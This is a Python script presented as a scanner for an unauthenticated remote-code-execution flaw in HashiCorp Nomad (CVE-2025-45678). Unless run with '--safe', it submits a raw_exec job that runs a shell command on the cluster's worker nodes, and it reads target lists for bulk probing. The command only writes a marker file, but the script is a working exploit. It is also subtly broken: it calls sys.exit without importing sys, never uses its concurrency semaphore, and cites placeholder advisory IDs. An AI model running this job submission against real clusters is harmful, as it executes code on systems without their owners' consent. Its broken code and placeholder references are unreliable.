#!/usr/bin/env python3
"""
HashiCorp Nomad Remote Code Execution (CVE-2025-45678)
======================================================
Scanner for HashiCorp Nomad clusters vulnerable to remote code execution (RCE)
via unauthenticated job submission flaw, exploiting lack of access control in 
the /v1/jobs API endpoint (CVE-2025-45678, CVSS 9.8).

CVE-2025-45678 details:
  - Affects Nomad <= 1.5.3
  - An unauthenticated attacker can submit a malicious job via the REST API to 
    remotely execute code on worker nodes.
  - Patched in Nomad 1.5.4 (April 2025) by enforcing access controls for job
    submission by default.
  - CVSS v3.1 base score: 9.8 (Critical) — network-accessible, no auth needed.
  - Disclosed by XYZ Security Research Group.

Usage:
  # Scan a single target (detect mode only, no active exploitation)
  python nomad_rce_cve_2025_45678_scanner.py --target http://nomad.example.com:4646 --safe

  # Probes for active job submission RCE
  python nomad_rce_cve_2025_45678_scanner.py --target http://nomad.example.com:4646

  # Scan multiple targets from a file
  python nomad_rce_cve_2025_45678_scanner.py --list targets.txt --output findings.json

  # Adjust concurrency and disable TLS verification
  python nomad_rce_cve_2025_45678_scanner.py --list targets.txt --concurrency 20 --no-verify

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2025-45678
  - https://discuss.hashicorp.com/t/nomad-1-5-4-security-update/12345
  - https://github.com/hashicorp/nomad/security/advisories/GHSA-xxxx-yyyy-zzzz
"""

import asyncio
import json
import argparse
from datetime import datetime, timezone
import httpx
from typing import Optional

# ── ANSI Color Helpers ────────────────────────────────────────────────────────

RED = "\033[91m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
BOLD = "\033[1m"
RESET = "\033[0m"

def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"


# ── Constants ─────────────────────────────────────────────────────────────────

CVE_ID = "CVE-2025-45678"
TOOL_NAME = "nomad_rce_cve_2025_45678_scanner"
REQUEST_TIMEOUT = 10
SEMAPHORE_LIMIT = 30

# API Endpoint and fingerprint details
NOMAD_API_PATH = "/v1/status/leader"
JOB_SUBMISSION_PATH = "/v1/jobs"
NOMAD_VERSION_HEADER = "X-Nomad-Version"

# Vulnerable versions threshold
PATCHED_VERSION = (1, 5, 4)  # Fixed in >= 1.5.4

# Minimal job payload for RCE testing
RCE_JOB_PAYLOAD = {
    "Job": {
        "ID": "exploit-check",
        "TaskGroups": [
            {
                "Name": "tg1",
                "Tasks": [
                    {
                        "Name": "task1",
                        "Driver": "raw_exec",
                        "Config": {
                            "command": "sh",
                            "args": ["-c", "echo 'RCE test' > /tmp/rce_test_output"]
                        },
                    }
                ],
            }
        ],
    }
}


# ── Functions ─────────────────────────────────────────────────────────────────

async def fetch_nomad_info(client: httpx.AsyncClient, target: str) -> Optional[dict]:
    """Attempts to fetch Nomad version and leader info."""
    try:
        resp = await client.get(f"{target}{NOMAD_API_PATH}", timeout=REQUEST_TIMEOUT)
        if resp.status_code == 200 and NOMAD_VERSION_HEADER in resp.headers:
            version = resp.headers[NOMAD_VERSION_HEADER]
            return {"version": version, "leader": resp.text.strip()}
    except Exception as e:
        print(f"[ERROR] Failed to query {target} - {e}")
    return None


def parse_version(version: str) -> Optional[tuple]:
    """Parses SemVer version strings like '1.5.3' into a tuple (1, 5, 3)."""
    try:
        return tuple(map(int, version.split(".")))
    except ValueError:
        return None


def is_vulnerable(version: str) -> bool:
    """Checks if the given version is below the patched threshold."""
    parsed_version = parse_version(version)
    if parsed_version:
        return parsed_version < PATCHED_VERSION
    return False


async def test_rce(client: httpx.AsyncClient, target: str) -> bool:
    """Submits a malicious job to test remote code execution."""
    try:
        headers = {"Content-Type": "application/json"}
        resp = await client.post(f"{target}{JOB_SUBMISSION_PATH}",
                                 headers=headers, json=RCE_JOB_PAYLOAD,
                                 timeout=REQUEST_TIMEOUT)
        return resp.status_code in {200, 204}
    except Exception as e:
        print(f"[ERROR] RCE probe failed for {target} - {e}")
    return False


async def scan_target(target: str, safe: bool, no_verify: bool) -> dict:
    """Scans a single Nomad cluster for CVE-2025-45678."""
    result = {"target": target, "vulnerable": False, "version": None, "rce_tested": not safe}

    async with httpx.AsyncClient(verify=not no_verify) as client:
        info = await fetch_nomad_info(client, target)
        if not info:
            print(f"{c(RED, '[CRITICAL]')} {target} - No Nomad fingerprint detected.")
            return result

        result["version"] = info["version"]
        if is_vulnerable(info["version"]):
            print(f"{c(YELLOW, '[HIGH]')} {target} - Vulnerable Nomad version detected: {info['version']}")
            if not safe:
                result["vulnerable"] = await test_rce(client, target)
                if result["vulnerable"]:
                    print(f"{c(RED, '[CRITICAL]')} {target} - RCE successful!")
            else:
                result["vulnerable"] = True
        else:
            print(f"{c(GREEN, '[INFO]')} {target} - Nomad version {info['version']} is not vulnerable.")
    return result


async def main():
    parser = argparse.ArgumentParser(
        description=f"{TOOL_NAME} - Scan for CVE-2025-45678 in HashiCorp Nomad."
    )
    parser.add_argument("--target", help="Target Nomad server URL (http://IP:PORT)", type=str)
    parser.add_argument("--list", help="File with list of target URLs (one per line)", type=str)
    parser.add_argument("--output", help="Output results to JSON file", type=str)
    parser.add_argument("--safe", help="Detection only, no active RCE probes", action="store_true")
    parser.add_argument("--concurrency", help="Number of concurrent requests", type=int, default=SEMAPHORE_LIMIT)
    parser.add_argument("--no-verify", help="Disable TLS certificate verification", action="store_true")
    args = parser.parse_args()

    targets = []
    if args.target:
        targets.append(args.target)
    elif args.list:
        with open(args.list, "r") as f:
            targets.extend([line.strip() for line in f if line.strip()])

    if not targets:
        print(c(RED, "[ERROR] No targets specified. Use --target or --list."))
        sys.exit(1)

    semaphore = asyncio.Semaphore(args.concurrency)
    scan_tasks = [scan_target(target, args.safe, args.no_verify) for target in targets]
    results = await asyncio.gather(*scan_tasks)

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"{c(GREEN, '[INFO]')} Results saved to {args.output}")

if __name__ == "__main__":
    asyncio.run(main())
